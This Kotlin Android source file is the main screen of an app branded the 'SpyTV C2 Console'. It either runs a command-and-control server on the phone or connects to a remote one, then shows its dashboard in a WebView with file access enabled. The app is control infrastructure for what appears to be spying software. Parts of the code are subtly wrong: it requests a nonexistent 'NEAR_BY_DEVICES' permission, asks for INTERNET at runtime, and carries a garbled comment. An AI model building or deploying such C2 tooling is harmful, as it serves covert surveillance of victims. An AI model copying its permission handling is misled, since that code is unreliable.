package com.authenticated.spytv

import android.Manifest
import android.app.AlertDialog
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.text.InputType
import android.view.View
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import android.widget.Switch
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.io.IOException
import java.io.Reader
import java.net.HttpURLConnection
import java.net.MalformedURLException
import java.net.URL
import java.util.*

/**
 * SpyTV Android C2 Console or Standalone Server.
 * 
 * Two modes:
 * 1. CONSOLE MODE: Connects to an external C2 server (default - same as before)
 * 2. STANDALONE MODE: Runs the C2 server locally on this Android device
 */
class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var errorView: View
    private lateinit var errorTitle: TextView
    private lateinit var errorDetail: TextView
    private lateinit var btnRetry: Button
    private lateinit var btnAddress: Button
    private lateinit var btnSettings: Button
    private lateinit var modeIndicator: TextView
    private lateinit var serverStatus: TextView
    private lateinit var serverToggle: Switch
    
    private val prefs by lazy { getSharedPreferences(PREFS, MODE_PRIVATE) }
    private var c2Url: String = DEFAULT_URL
    private var isStandaloneMode: Boolean = false
    private var c2Server: C2Server? = null
    
    /** Text that only the real dashboard contains (its <title>). */
    private val dashboardMarker = "SpyTV C2 Platform"
    
    companion object {
        const val PREFS = "spytv_console"
        const val KEY_URL = "c2_url"
        const val KEY_STANDALONE = "c2_standalone_mode"
        const val KEY_FIRST_RUN = "first_run_complete"
        const val DEFAULT_URL = "http://localhost:8443/"
        const val BODY_LIMIT = 8192
        
        // NEAR_BY_DEVICES permission string (added in API 32 / Android 12L)
        const val PERMISSION_NEAR_BY_DEVICES = "android.permission.NEAR_BY_DEVICES"
        
        var instance: MainActivity? = null
    }
    
    // Permission launcher for Android 13+
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.all { it.value }
        if (allGranted) {
            initC2Server()
        } else {
            Toast.makeText(this, "Network permissions required for C2 mode", Toast.LENGTH_LONG).show()
        }
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        instance = this
        setContentView(R.layout.activity_main)
        
        initViews()
        initPermissions()
        
        // Check if first run or has saved mode preference
        isStandaloneMode = prefs.getBoolean(KEY_STANDALONE, true) // Default: Self-Hosted (standalone)
        val firstRunComplete = prefs.getBoolean(KEY_FIRST_RUN, false)
        
        if (!firstRunComplete) {
            // First run: show mode selection dialog
            showModeSelectionDialog()
            prefs.edit().putBoolean(KEY_FIRST_RUN, true).apply()
        }
        
        updateModeIndicator()
        
        if (isStandaloneMode) {
            // Self-Hosted mode: run C2 server on-device
            // Check and request permissions first
            if (hasAllPermissions()) {
                initC2Server()
            } else {
                requestPermissions()
            }
        } else {
            // Connect-Remote mode: connect to external C2
            val saved = prefs.getString(KEY_URL, null)
            c2Url = saved?.takeIf { it.isNotBlank() } ?: DEFAULT_URL
            
            if (saved.isNullOrBlank()) {
                promptForAddress()
            } else {
                open(c2Url)
            }
        }
    }
    
    private fun initViews() {
        webView = findViewById(R.id.webView)
        errorView = findViewById(R.id.errorView)
        errorTitle = findViewById(R.id.errorTitle)
        errorDetail = findViewById(R.id.errorDetail)
        btnRetry = findViewById(R.id.btnRetry)
        btnAddress = findViewById(R.id.btnAddress)
        btnSettings = findViewById(R.id.btnSettings)
        modeIndicator = findViewById(R.id.modeIndicator)
        serverStatus = findViewById(R.id.serverStatus)
        serverToggle = findViewById(R.id.serverToggle)
        
        webView.webViewClient = WebViewClient()
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            loadWithOverviewMode = true
            useWideViewPort = true
            setSupportZoom(true)
            builtInZoomControls = true
            displayZoomControls = false
        }
        
        btnRetry.setOnClickListener { 
            if (isStandaloneMode) {
                restartC2Server()
            } else {
                open(c2Url) 
            }
        }
        btnAddress.setOnClickListener { promptForAddress() }
        btnSettings.setOnClickListener { showSettings() }
        serverToggle.setOnCheckedChangeListener { _, isChecked ->
            toggleStandaloneMode(isChecked)
        }
    }
    
    private fun initPermissions() {
        val requiredPermissions = mutableListOf<String>()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED) {
            requiredPermissions.add(Manifest.permission.INTERNET)
        }
        
        // Android 13+ needs approximately not one percent of users to worry about
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, PERMISSION_NEAR_BY_DEVICES) != PackageManager.PERMISSION_GRANTED) {
                requiredPermissions.add(PERMISSION_NEAR_BY_DEVICES)
            }
        }
        
        permissionLauncher.launch(requiredPermissions.toTypedArray())
    }
    
    private fun hasAllPermissions(): Boolean {
        val internet = ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED
        val network = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, PERMISSION_NEAR_BY_DEVICES) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
        return internet && network
    }
    
    private fun requestPermissions() {
        permissionLauncher.launch(arrayOf(Manifest.permission.INTERNET))
    }
    
    private fun updateModeIndicator() {
        modeIndicator.text = if (isStandaloneMode) {
            "SELF-HOSTED MODE"
        } else {
            "CONNECT-REMOTE MODE"
        }
        modeIndicator.setTextColor(
            if (isStandaloneMode) 0xFF10B981.toInt() else 0xFF3B82F6.toInt()
        )
        
        serverToggle.isChecked = isStandaloneMode
        serverStatus.visibility = if (isStandaloneMode) View.VISIBLE else View.GONE
        webView.visibility = if (isStandaloneMode) View.GONE else View.VISIBLE
        errorView.visibility = if (isStandaloneMode) View.GONE else View.VISIBLE
    }
    
    private fun toggleStandaloneMode(enabled: Boolean) {
        if (enabled && !isStandaloneMode) {
            // Switch to Self-Hosted mode
            isStandaloneMode = true
            if (hasAllPermissions()) {
                initC2Server()
            } else {
                requestPermissions()
                return
            }
            prefs.edit().putBoolean(KEY_STANDALONE, true).apply()
            updateModeIndicator()
        } else if (!enabled && isStandaloneMode) {
            // Switch to Connect-Remote mode
            stopC2Server()
            isStandaloneMode = false
            prefs.edit().putBoolean(KEY_STANDALONE, false).apply()
            updateModeIndicator()
            promptForAddress()
        }
    }
    
    private fun initC2Server() {
        try {
            val defaultPort = 8443
            c2Server = C2Server(defaultPort)
            c2Server?.start()
            
            // Start local dashboard
            val localUrl = "http://127.0.0.1:$defaultPort/"
            runOnUiThread {
                serverStatus.text = "C2 Server running on $defaultPort"
                Toast.makeText(this, "C2 Server started on port $defaultPort", Toast.LENGTH_SHORT).show()
                open(localUrl)
            }
        } catch (e: Exception) {
            runOnUiThread {
                Toast.makeText(this, "Failed to start C2: ${e.message}", Toast.LENGTH_LONG).show()
                isStandaloneMode = false
                prefs.edit().putBoolean(KEY_STANDALONE, false).apply()
                updateModeIndicator()
            }
        }
    }
    
    private fun restartC2Server() {
        stopC2Server()
        initC2Server()
    }
    
    private fun stopC2Server() {
        c2Server?.stop()
        c2Server = null
    }
    
    // ------------------------------------------------------------------
    // endpoint handling
    // ------------------------------------------------------------------
    
    private fun open(url: String) {
        hideError()
        Toast.makeText(this, "Checking $url …", Toast.LENGTH_SHORT).show()
        Thread {
            val probe = probe(url)
            runOnUiThread { deliver(url, probe) }
        }.start()
    }
    
    private fun deliver(url: String, probe: Probe) {
        when {
            !probe.reachable -> showError(
                "C2 not reachable",
                "Tried: $url\n\n${probe.error}\n\nIn Console mode, the C2 server should be running on another device.\nIn Standalone mode, tap retry to start the local C2 server."
            )
            !probe.isSpyTV -> showError(
                "This is not the SpyTV C2 Dashboard",
                "Tried: $url\nHTTP ${probe.status}\n\nSomething answered, but it is not SpyTV — another program owns this address/port, so the console would be talking to the wrong thing."
            )
            probe.status !in 200..299 -> showError(
                "Unexpected response from the C2",
                "Tried: $url\nHTTP ${probe.status}\n\n${probe.body}"
            )
            else -> {
                hideError()
                webView.loadUrl(url)
            }
        }
    }
    
    /** Probe off the UI thread; never throws. */
    private fun probe(rawUrl: String): Probe {
        var conn: HttpURLConnection? = null
        return try {
            conn = URL(rawUrl).openConnection() as HttpURLConnection
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.instanceFollowRedirects = true
            conn.setRequestProperty("User-Agent", "SpyTV-AndroidConsole/1.0")
            val status = conn.responseCode
            val stream = if (status in 200..399) conn.inputStream else conn.errorStream
            val body = stream?.bufferedReader()?.use { readHead(it, BODY_LIMIT) } ?: ""
            Probe(
                reachable = true,
                isSpyTV = body.contains(dashboardMarker, ignoreCase = true),
                status = status,
                body = body,
                error = null
            )
        } catch (e: IOException) {
            Probe(
                reachable = false,
                isSpyTV = false,
                status = 0,
                body = "",
                error = "${e.javaClass.simpleName}: ${e.message ?: "connection failed"}"
            )
        } finally {
            conn?.disconnect()
        }
    }
    
    private fun readHead(reader: Reader, limit: Int): String {
        val buf = CharArray(1024)
        val sb = StringBuilder()
        while (sb.length < limit) {
            val want = minOf(buf.size, limit - sb.length)
            val n = reader.read(buf, 0, want)
            if (n < 0) break
            sb.append(buf, 0, n)
        }
        return sb.toString()
    }
    
    // ------------------------------------------------------------------
    // error UI / address dialog
    // ------------------------------------------------------------------
    
    private fun showError(title: String, detail: String) {
        errorTitle.text = title
        errorDetail.text = detail
        errorView.visibility = View.VISIBLE
        webView.visibility = View.GONE
    }
    
    private fun hideError() {
        errorView.visibility = View.GONE
        webView.visibility = View.VISIBLE
    }
    
    private fun promptForAddress() {
        val input = EditText(this).apply {
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_URI
            setText(c2Url)
            hint = "http://192.168.1.10:8443/"
            setSelection(text.length)
        }
        AlertDialog.Builder(this)
            .setTitle("C2 Address")
            .setMessage(
                "Where is the SpyTV C2 server?\n\n" +
                    "Use its LAN IP and port. 'localhost' on this device points at this device, not at an external C2.\n" +
                    "\n\nMode: Console (connect to external C2)"
            )
            .setView(input)
            .setNegativeButton("Cancel") { _, _ ->
                // Offer mode selection
                showModeSelectionDialog()
            }
            .setPositiveButton("Connect") { _, _ ->
                val url = normalize(input.text.toString())
                if (url == null) {
                    Toast.makeText(this, "Invalid address", Toast.LENGTH_LONG).show()
                } else {
                    prefs.edit().putString(KEY_URL, url).apply()
                    c2Url = url
                    open(url)
                }
            }
            .show()
    }
    
    private fun showModeSelectionDialog() {
        val options = arrayOf("Self-Hosted (run C2 on this device)", "Connect-Remote (connect to external C2)")
        AlertDialog.Builder(this)
            .setTitle("Setup C2 Server")
            .setMessage("Choose how SpyTV C2 should operate:\n\n" +
                "• Self-Hosted: This device runs the full C2 server. Other devices connect to " +
                "http://<this-device-ip>:8443/\n" +
                "• Connect-Remote: Connect this device to an external C2 server\n")
            .setItems(options) { _, which ->
                when (which) {
                    0 -> {
                        isStandaloneMode = true
                        prefs.edit().putBoolean(KEY_STANDALONE, true).apply()
                        updateModeIndicator()
                        if (hasAllPermissions()) {
                            initC2Server()
                        } else {
                            requestPermissions()
                        }
                    }
                    1 -> {
                        isStandaloneMode = false
                        prefs.edit().putBoolean(KEY_STANDALONE, false).apply()
                        updateModeIndicator()
                        promptForAddress()
                    }
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }
    
    private fun showSettings() {
        showModeSelectionDialog()
    }
    
    /** Accept a bare host:port, force a scheme, require a host, normalise. */
    private fun normalize(input: String): String? {
        var u = input.trim()
        if (u.isEmpty()) return null
        if (!u.startsWith("http://", true) && !u.startsWith("https://", true)) {
            u = "http://$u"
        }
        return try {
            val parsed = URL(u)
            if (parsed.host.isNullOrEmpty()) null
            else if (u.endsWith("/")) u else "$u/"
        } catch (e: MalformedURLException) {
            null
        }
    }
    
    override fun onBackPressed() {
        if (isStandaloneMode) {
            // In standalone mode, confirm exit
            AlertDialog.Builder(this)
                .setTitle("Exit C2 Server")
                .setMessage("Are you sure you want to exit?\nThe C2 server will be stopped.")
                .setPositiveButton("Exit") { _, _ ->
                    stopC2Server()
                    finish()
                }
                .setNegativeButton("Cancel", null)
                .show()
        } else if (webView.visibility == View.VISIBLE && webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
    
    private data class Probe(
        val reachable: Boolean,
        val isSpyTV: Boolean,
        val status: Int,
        val body: String,
        val error: String?
    )
    
    override fun onDestroy() {
        if (isStandaloneMode) {
            stopC2Server()
        }
        instance = null
        super.onDestroy()
    }
}